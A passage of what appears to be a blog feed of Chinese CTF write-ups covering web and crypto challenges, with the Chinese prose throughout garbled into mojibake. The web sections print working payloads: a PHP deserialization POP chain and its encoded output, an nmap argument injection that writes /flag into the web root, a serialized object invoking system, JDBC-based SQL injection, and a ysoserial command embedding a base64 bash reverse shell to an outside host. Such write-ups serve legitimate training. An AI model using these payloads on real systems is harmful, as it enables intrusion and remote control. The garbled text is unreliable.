·å°±å¯ä»¥è°ƒç”¨Generatorçš„__callä»è€ŒRCEã€‚ã€‚Vendoræ–‡ä»¶å¤¹é‡Œæœç´¢__destructï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-4554eadef6216c8c.png" alt="image.png"></p><p>parentå¯ä»¥æ§åˆ¶ï¼Œé‚£ä¹ˆä»¿ç…§é“¾æ¥ä¸­çš„ä¾‹å­ï¼Œæˆ‘ä»¬å°±å¯ä»¥å®ç°RCEã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$parent,$route</span>)</span>&#123;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;parent=$parent;</span><br><span class="line">              <span class="keyword">$this</span>-&gt;route=$route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$formatters</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters=$formatters; </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">generator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">Generator</span>(<span class="title">array</span>(&quot;<span class="title">addCollection</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;));</span><br><span class="line">    $exp = <span class="keyword">new</span> \Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($generator,<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($exp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A64%3A%22Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%22%3A2%3A%7Bs%3A72%3A%22%00Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%00parent%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3Ba%3A1%3A%7Bs%3A13%3A%22addCollection%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A71%3A%22%00Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CImportConfigurator%00route%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020ç½‘é¼æ¯-æœ±é›€ç»„wp</title>
      <link href="/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/"/>
      <url>/2020/05/18/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E6%9C%B1%E9%9B%80/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>å¯ä»¥æ‰«æipï¼Œå°è¯•å‘½ä»¤æ³¨å…¥æœªæœï¼Œåº”è¯¥æ˜¯è°ƒç”¨äº†nmapè¿›è¡Œæ‰«æã€‚</p><a id="more"></a><p>nmapå¯ä»¥è¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œæ‰«æï¼Œflagè‚¯å®šæ˜¯éæ³•ipï¼Œnmapè¾“å‡ºä¼šæŠŠå†…å®¹æŠ¥é”™å‡ºæ¥ï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼ŒæŠŠç»“æœè¾“å‡ºåˆ°webç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; -iL &#x2F;flag -oN &#x2F;var&#x2F;www&#x2F;html&#x2F;abc.txt &#39;</span><br></pre></td></tr></table></figure><p> è®¿é—®abc.txtã€‚</p><h3 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h3><p>ä¼ å…¥çš„pä¸funcæ˜¯ $func($p) å½¢å¼æ‰§è¡Œï¼Œå¯ä»¥è¯»åˆ°æºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func&#x3D;readfile&amp;p&#x3D;index.php</span><br></pre></td></tr></table></figure><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $disable_fun = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params">$func, $p</span>) </span>&#123;</span><br><span class="line">        $result = call_user_func($func, $p);</span><br><span class="line">        $a= gettype($result);</span><br><span class="line">        <span class="keyword">if</span> ($a == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $p = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> $func = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func = $_REQUEST[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    $p = $_REQUEST[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($func != <span class="literal">null</span>) &#123;</span><br><span class="line">        $func = strtolower($func);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>banäº†æ‰§è¡Œä»£ç ä¹‹ç±»çš„å‡½æ•°ï¼Œgettime æœ‰ä¸ª call_user_funcï¼Œè¿˜æœ‰ä¸ªç±»ï¼Œæƒ³åˆ°å¯ä»¥ååºåˆ—åŒ–ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Test());</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/9223743-21d75094c0b434e2.png" alt="image.png"></p><p>è¯»å–flagã€‚</p><h3 id="think-java"><a href="#think-java" class="headerlink" title="think java"></a>think java</h3><p>è¿™ä¸ªé¢˜æ¯”èµ›åšäº†ä¸€åŠï¼Œåœ¨buuojå¤ç°çš„ã€‚</p><p>æ‰«äº†ä¸€æ³¢ç›®å½•ï¼Œå‘ç°äº†swagger-ui.htmlï¼Œçœ‹åˆ°äº†ä¸‰ä¸ªapiï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-a93e2a84b569cc08.png" alt="image.png"></p><p>sqlDictä¼ å…¥ä¸€ä¸ªdbnameã€‚</p><p>ç»™äº†éƒ¨åˆ†classï¼Œæ‹–åˆ°jdguiåˆ†æï¼Œjdbcè¿æ¥æ•°æ®åº“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SqlDict</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">    Connection conn = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (dbName != <span class="keyword">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">if</span> (user == <span class="keyword">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        user = <span class="string">&quot;root&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span> (pass == <span class="keyword">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        pass = <span class="string">&quot;abc@12345&quot;</span>; </span><br><span class="line">      conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> conn;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œtest æ¥å£å¯ä»¥ä¼ å…¥ dbNameï¼Œæ‹¼æ¥åˆ°è¿æ¥ï¼Œæƒ³åˆ°äº†jdbcååºåˆ—åŒ–ï¼Œå¾€ä¸‹çœ‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title">getTableData</span><span class="params">(String dbName, String user, String pass)</span> </span>&#123;</span><br><span class="line">  List&lt;Table&gt; Tables = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">  Connection conn = getConnection(dbName, user, pass);</span><br><span class="line">  String TableName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    Statement stmt = conn.createStatement();</span><br><span class="line">    DatabaseMetaData metaData = conn.getMetaData();</span><br><span class="line">    ResultSet tableNames = metaData.getTables((String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, (String)<span class="keyword">null</span>, <span class="keyword">new</span> String[] &#123; <span class="string">&quot;TABLE&quot;</span> &#125;);</span><br><span class="line">    <span class="keyword">while</span> (tableNames.next()) &#123;</span><br><span class="line">      TableName = tableNames.getString(<span class="number">3</span>);</span><br><span class="line">      Table table = <span class="keyword">new</span> Table();</span><br><span class="line">      String sql = <span class="string">&quot;Select TABLE_COMMENT from INFORMATION_SCHEMA.TABLES Where table_schema = &#x27;&quot;</span> + dbName + <span class="string">&quot;&#x27; and table_name=&#x27;&quot;</span> + TableName + <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">      ResultSet rs = stmt.executeQuery(sql);</span><br><span class="line">      <span class="keyword">while</span> (rs.next())</span><br><span class="line">        table.setTableDescribe(rs.getString(<span class="string">&quot;TABLE_COMMENT&quot;</span>)); </span><br><span class="line">      table.setTableName(TableName);</span><br><span class="line">      ResultSet data = metaData.getColumns(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName, <span class="string">&quot;&quot;</span>);</span><br><span class="line">      ResultSet rs2 = metaData.getPrimaryKeys(conn.getCatalog(), (String)<span class="keyword">null</span>, TableName);</span><br><span class="line">      String PK;</span><br><span class="line">      <span class="keyword">for</span> (PK = <span class="string">&quot;&quot;</span>; rs2.next(); PK = rs2.getString(<span class="number">4</span>));</span><br><span class="line">      <span class="keyword">while</span> (data.next()) &#123;</span><br><span class="line">        Row row = <span class="keyword">new</span> Row(data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>), data.getString(<span class="string">&quot;TYPE_NAME&quot;</span>), data.getString(<span class="string">&quot;COLUMN_DEF&quot;</span>), data.getString(<span class="string">&quot;NULLABLE&quot;</span>).equals(<span class="string">&quot;1&quot;</span>) ? <span class="string">&quot;YES&quot;</span> : <span class="string">&quot;NO&quot;</span>, data.getString(<span class="string">&quot;IS_AUTOINCREMENT&quot;</span>), data.getString(<span class="string">&quot;REMARKS&quot;</span>), data.getString(<span class="string">&quot;COLUMN_NAME&quot;</span>).equals(PK) ? <span class="string">&quot;true&quot;</span> : <span class="keyword">null</span>, data.getString(<span class="string">&quot;COLUMN_SIZE&quot;</span>));</span><br><span class="line">        table.list.add(row);</span><br><span class="line">      &#125; </span><br><span class="line">      Tables.add(table);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125; <span class="keyword">catch</span> (SQLException var16) &#123;</span><br><span class="line">    var16.printStackTrace();</span><br><span class="line">  &#125; </span><br><span class="line">  <span class="keyword">return</span> Tables;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ‰æ³¨å…¥çš„æ ·å­ï¼ŒæŠŠdbnameæ‹¼æ¥åˆ°äº†è¯­å¥é‡Œã€‚</p><p>åº”è¯¥æ˜¯æ³¨å…¥å‡ºç”¨æˆ·åå¯†ç ï¼Œç„¶åç™»é™†ï¼Œç™»é™†åé¢è¿˜æœ‰é¢˜ã€‚</p><p>ä½†æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ dbnameéœ€è¦æ­£ç¡®è¿æ¥ï¼ŒåŒæ—¶è¿˜è¦æ³¨å…¥ï¼Œå¯ä»¥ç”¨#æˆªæ–­ä½¿jdbcæ­£å¸¸è¿æ¥ï¼Œç„¶åæ³¨å…¥payloadæ”¾åˆ°åé¢ã€‚</p><p>å¯ä»¥æ³¨å…¥å‡ºç”¨æˆ·åå’Œå¯†ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-002248aa671587e7.png" alt="image.png"></p><p>ç”¨æˆ·åæ˜¯ adminï¼Œå¯†ç æ˜¯admin@Rrrr_ctf_asdeã€‚</p><p>ç™»é™†ï¼Œå‘ç°ç»™äº†ä¸ªtokenã€‚</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-bc25eb7e982fffd3.png" alt="image.png"></p><p>Beareråé¢éƒ¨åˆ†æ˜æ˜¾æ˜¯åºåˆ—åŒ–æ•°æ®çš„base64ç¼–ç ï¼Œè¿˜æœ‰ä¸ªcurrentæ¥å£ï¼Œæˆ‘ä»¬æŠŠtoken postè¿‡å»ï¼Œå‘ç°æ ¡éªŒæˆåŠŸã€‚</p><p>æ€è·¯å¾ˆæ¸…æ™°äº†ï¼Œcurrentä¼šååºåˆ—åŒ–æˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼Œæˆ‘ä»¬éœ€è¦ getshellï¼Œä½†æ˜¯æ²¡æœ‰gadgetã€‚ã€‚ã€‚</p><p>æ¯”èµ›çš„æ—¶å€™å¡åœ¨äº†è¿™é‡Œã€‚ã€‚ã€‚æœ¬æ¥è¿™ä¸ªé¢˜æ”¾å‡ºæ¥ä¸€é˜µå­éƒ½åªæœ‰3ä¸ªé˜Ÿåšå‡ºæ¥ï¼Œåæ¥çªç„¶å°±å‡ åæ”¯äº†ï¼Œä½›äº†ã€‚</p><p>èµ›åé—®äº†ä¸€æ³¢ï¼Œè²Œä¼¼æ˜¯ç”¨ysoserialæŒ¨ä¸ªexpæ‰“ï¼Ÿ</p><p>ysoserial æ˜¯ä¸ªé›†æˆäº†javaååºåˆ—åŒ–expçš„å·¥å…·ï¼Œgithubåœ¨è¿™é‡Œï¼š<a href="https://github.com/frohoff/ysoserialã€‚">https://github.com/frohoff/ysoserialã€‚</a></p><p>è¿™ä¸ªé¢˜æ˜¯ç”¨ ROME æ‰“çš„ï¼Œé¦–å…ˆä¸‹è½½ysoserialæ–‡ä»¶ï¼Œå› ä¸ºjava åå¼¹shellå®¹æ˜“å‡ºé—®é¢˜ï¼Œæ‰¾äº†ä¸ªåœ¨çº¿ç½‘ç«™æ”¹ä¸€ä¸‹payloadï¼š<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-5d91acf48a023ca4.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar ROME <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MTc4LTg5N2VhMDQwLTU2YzAtNDg2NC04NWM1LWE4YWY4ZmJjMmY4ZS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span> | base64</span><br></pre></td></tr></table></figure><p>æŠŠç”Ÿæˆçš„base64ï¼Œcurrentæ¥å£å‘è¿‡å»ï¼ˆè®°å¾—å‰é¢åŠ Bearerã€‚ã€‚å› ä¸ºæ²¡åŠ Beareræ‰¾äº†åŠå¤©é—®é¢˜orzï¼‰</p><p>å¯ä»¥å¼¹åˆ°shellï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-0fd81c5d04ad08c1.png" alt="image.png"></p><p>é¡ºä¾¿è¯´ä¸€å¥ï¼Œå¦‚æœæ‰“ä¸æˆï¼Œå¯ä»¥è¯•ç€å…ˆç”¨ysoserialçš„URLDNSæ¨¡å—æµ‹è¯•ååºåˆ—åŒ–æ˜¯å¦å¯ä»¥ç”¨ï¼Œå…ˆæŠŠURLDNSæ‰“æˆã€‚</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Simple"><a href="#Simple" class="headerlink" title="Simple"></a>Simple</h3><p>ä»¿å°„å¯†ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;kgws&#123;m8u8cm65-ue9k-44k5-8361-we225m76eeww&#125;&quot;</span></span><br><span class="line">k1 = <span class="number">123456</span> % <span class="number">26</span></span><br><span class="line">k2 = <span class="number">321564</span> % <span class="number">26</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">        flag += c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> string.ascii_lowercase:</span><br><span class="line">            <span class="keyword">if</span> (k1 * (<span class="built_in">ord</span>(m) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)) + k2) % <span class="number">26</span> == <span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">                flag += m</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><h3 id="RUA"><a href="#RUA" class="headerlink" title="RUA"></a>RUA</h3><p>ä¸‰ç»„nä¸cï¼Œæ²¡æœ‰eï¼Œnéƒ½å¾ˆå¤§ï¼Œç›¸äº’äº’ç´ ã€‚</p><p>è€ƒè™‘ä¸­å›½å‰©ä½™å®šç†ï¼Œç„¶åå¼€ä¸‰æ¬¡æ–¹ï¼Œå¼€ä¸å‡ºæ¥ã€‚Næœ‰å¤§çº¦6000å¤šbitï¼Œçˆ†ç ´eå¼€æ–¹ï¼Œå‘ç°æ˜¯17æ¬¡æ–¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GCRT</span>(<span class="params">mi, ai</span>):</span></span><br><span class="line">    <span class="comment"># mi,aiåˆ†åˆ«è¡¨ç¤ºæ¨¡æ•°å’Œå–æ¨¡åçš„å€¼,éƒ½ä¸ºåˆ—è¡¨ç»“æ„</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(mi, <span class="built_in">list</span>) <span class="keyword">and</span> <span class="built_in">isinstance</span>(ai, <span class="built_in">list</span>))</span><br><span class="line">    curm, cura = mi[<span class="number">0</span>], ai[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi[<span class="number">1</span>:], ai[<span class="number">1</span>:]):</span><br><span class="line">        d = gmpy2.gcd(curm, m)</span><br><span class="line">        c = a - cura</span><br><span class="line">        <span class="keyword">assert</span> (c % d == <span class="number">0</span>) <span class="comment">#ä¸æˆç«‹åˆ™ä¸å­˜åœ¨è§£</span></span><br><span class="line">        K = c / d * gmpy2.invert(curm / d, m / d)</span><br><span class="line">        cura += curm * K</span><br><span class="line">        curm = curm * m / d</span><br><span class="line">    <span class="keyword">return</span> (cura % curm, curm) <span class="comment">#(è§£,æœ€å°å…¬å€æ•°)</span></span><br><span class="line"></span><br><span class="line">n1 = <span class="number">18856599160001833299560082802925753595735945621023660831294740454109973698430284916320395522883536507135735383517926050963512440162483065097256884040938259092582892259657340825971260278387406398529168309426241530551396056450450728728601248269612166083300938497235910244979946020059799495231539400114422748104072550004260736766137354572252872437140063474603268146956570787143010441293268321641092743010805639953103578977668248726500636191043930770036787317928372179939360510179438436665591755940224156131460271763912868322774604558314812111335691108887319827579162188169744014973478052491398688611046800951698773893393</span></span><br><span class="line">c1 = <span class="number">8024667293310019199660855174436055144348010556139300886990767145319919733369837206849070207955417356957254331839203914525519504562595117422955140319552013305532068903324132309109484106720045613714716627620318471048195232209672212970269569790677144450501305289670783572919282909796765124242287108717189750662740283813981242918671472893126494796140877412502365037187659905034193901633516360208987731322599974612602945866477752340080783296268396044532883548423045471565356810753599618810964317690395898263698123505876052304469769153374038403491084285836952034950978098249299597775306141671935146933958644456499200221696</span></span><br><span class="line">c2 = <span class="number">17388575106047489057419896548519877785989670179021521580945768965101106268068805843720622749203590810185213416901978773748832854888898576822477243682874784689127705334243899967896321836688567602323551986980634884700045627950473546069670440078998428940082620044462222475031805594211784370238038168894827559017562364252406425134530719911057780692073760058203345936344269833206906999625580911856011564697811258009937314511410514416706482571471852503756675411177080916350899445106002226392895645443215522671155311715637759618276305217468892076287376401516124640727839779731609203202530346427613422430202271506248285086956</span></span><br><span 